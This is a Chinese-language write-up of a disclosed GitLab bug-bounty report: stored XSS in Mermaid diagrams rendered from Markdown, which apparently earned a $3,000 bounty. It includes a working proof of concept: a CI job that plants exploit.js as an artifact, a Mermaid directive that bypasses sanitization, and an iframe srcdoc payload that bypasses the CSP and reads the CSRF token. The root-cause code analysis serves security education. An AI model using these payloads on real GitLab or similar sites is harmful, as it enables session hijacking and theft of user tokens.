
https://gitlab.com/gitlab-org/gitlab/-/issues/332528

gitlab漏洞系列-查看Markdown文件时在Mermaid中的存储型XSS

声明：文章中涉及的程序(方法)可能带有攻击性，仅供安全研究与教学之用，读者将其信息做其他用途，由用户承担全部法律及连带责任，文章作者不承担任何法律及连带责任。


## 背景
saleemrashid于2021年5月提交了这个漏洞:
Gitlab的Mermaid配置允许攻击者在渲染的Markdown中注入HTML,在一定条件下会引起RCE;

## 复现步骤
1.在`Gitlab.com`创建一个仓库;

2.添加以下至`.gitlab-ci.yml`
```
---  
job:  
  script:  
  - "echo 'alert(parent.document.querySelector(\"meta[name=csrf-token]\").outerHTML)' > exploit.js"  
  artifacts:  
    paths:  
    - exploit.js  

```
3.等待管道完成并记录作业ID(此流程和github中有点类似,一般开发中都会创建ci/cd的配置文件)

4.将以下内容添加到`README中.md`，相应地更改项目名称(`saleemrashid/mermaid-exploit-7032e404`)和作业ID (1303935016)
```
\```mermaid  
%%{init: {"flowchart": {"htmlLabels": "false"}} }%%  
flowchart  
  A["<iframe srcdoc='<script src=https://gitlab.com/api/v4/projects/saleemrashid%2Fmermaid-exploit-7032e404/jobs/1303935016/artifacts/exploit.js></script>'></iframe>"]  
\```  
```

5.打开`Readme.md`(或任何渲染它的页面，包括项目概述页面)，并观察由执行exploit.js引起的包含CSRF令牌的警报(例如:`<meta name=" CSRF -token" content="XXXXXX">`)

## 深入分析此漏洞原因
当启用`flowchart.htmlLabels`,并且securityLevel不是strict模式时,Mermaid是支持HTML labels的;GitLab的配置禁用了这个功能(https://gitlab.com/gitlab-org/gitlab/-/blob/v13.12.1-ee/app/assets/javascripts/behaviors/markdown/render_mermaid.js#L40-52)
```javascript
  mermaid.initialize({  
    // mermaid core options  
    mermaid: {  
      startOnLoad: false,  
    },  
    // mermaidAPI options  
    theme,  
    flowchart: {  
      useMaxWidth: true,  
      htmlLabels: false,  
    },  
    securityLevel: 'strict',  
  });  

```
但是，Mermaid也支持修改配置的指令(https://mermaid-js.github.io/mermaid/#/directives)。出于安全原因，这些指令不能覆盖某些配置选项  https://github.com/mermaid-js/mermaid/blob/8.9.2/src/defaultConfig.js#L114-L120
```
  /**  
   * This option controls which currentConfig keys are considered _secure_ and can only be changed via  
   * call to mermaidAPI.initialize. Calls to mermaidAPI.reinitialize cannot make changes to  
   * the `secure` keys in the current currentConfig. This prevents malicious graph directives from  
   * overriding a site's default security.  
   */  
  secure: ['secure', 'securityLevel', 'startOnLoad', 'maxTextSize'],  
```
虽然不能重写securityLevel，但结果是重写flowchart.htmlLabels为“false”(特别是字符串，而不是布尔值)足以绕过sanitization `https://github.com/mermaid-js/mermaid/blob/8.9.2/src/diagrams/common/common.js#L34-L54`
```javascript
  let htmlLabels = true;  
  if (  
    config.flowchart &&  
    (config.flowchart.htmlLabels === false || config.flowchart.htmlLabels === 'false')  
  ) {  
    htmlLabels = false;  
  }

  if (htmlLabels) { //aabb 
    const level = config.securityLevel;

    if (level === 'antiscript') {  
      txt = removeScript(txt);  
    } else if (level !== 'loose') {  
      // eslint-disable-line  
      txt = breakToPlaceholder(txt);  
      txt = txt.replace(/</g, '&lt;').replace(/>/g, '&gt;');  
      txt = txt.replace(/=/g, '&equals;');  
      txt = placeholderToBreak(txt);  
    }  
  }  
```
很显然,如果flowchart.htmlLabels被设置为false或者`"false"`,那么上面的代码将不会过滤标签(就是不走aabb处里面if中代码);
实际决定是将其呈现为HTML还是文本的代码总是使用if (`config.flowchart.htmlLabels`)，这对于字符串`“false”`将会成功(因为它是true)。这意味着绕过了sanitization，但字符串仍然呈现为HTML，从而导致XSS。(这里主要解释上面复现步骤中第四步)

为了利用此XSS，我们还需要绕过CSP:
```
script-src 'self' 'unsafe-inline' 'unsafe-eval' https://assets.gitlab-static.net https://www.google.com/recaptcha/ https://www.gstatic.com/recaptcha/ https://www.recaptcha.net/ https://apis.google.com 'nonce-<nonce>' 
```
我们可以利用这样一个事实，即Workhorse将使用基于文件扩展名`https://gitlab.com/gitlab-org/gitlab/-/blob/v13.12.1-ee/workhorse/internal/artifacts/entry.go#L98-101`的自动检测Content-Type来提供管道构件
```go
	// Write http headers about the file  
	headers.Set("Content-Length", contentLength)  
	headers.Set("Content-Type", detectFileContentType(fileName))  
	headers.Set("Content-Disposition", "attachment; filename=\""+escapeQuotes(basename)+"\"")  

```
虽然Content-Disposition头可以防止将其用于基于HTML/ svg的XSS，但它仍然允许将管道构件用作脚本或样式表;

RCE可以通过使用XSS注入以下HTML，并将管道构件作为JavaScript执行来实现(使用`<iframe srcdoc>`，因为你不能直接使用innerHTML注入`<script>`标签)。这个例子引用了私有存储库上的artifacts，但是你可以为实际的exploit启用公共管道(或向URL添加访问令牌)，以便任何用户都可以访问该artifacts。
```html
<iframe srcdoc='<script src=https://gitlab.com/api/v4/projects/saleemrashid%2Fmermaid-exploit-7032e404/jobs/1303935016/artifacts/exploit.js></script> 
```

此漏洞获得3000美刀